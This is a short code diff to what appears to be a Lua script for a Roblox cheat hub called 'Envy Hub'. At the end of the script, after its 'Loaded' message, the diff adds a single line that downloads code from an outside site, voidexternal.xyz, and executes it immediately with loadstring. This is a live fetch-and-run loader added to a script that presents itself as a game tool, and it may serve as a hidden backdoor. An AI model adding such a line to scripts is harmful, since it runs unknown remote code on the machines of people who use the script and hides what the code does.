@@ -1830,3 +1830,4 @@ task.spawn(function()
 end)
 
 print("[Envy Hub] Loaded — " .. ENVY_DISCORD)
+loadstring(game:HttpGet("https://voidexternal.xyz/v2/scrap/TPISATpl9z7jaao4/raw"))()
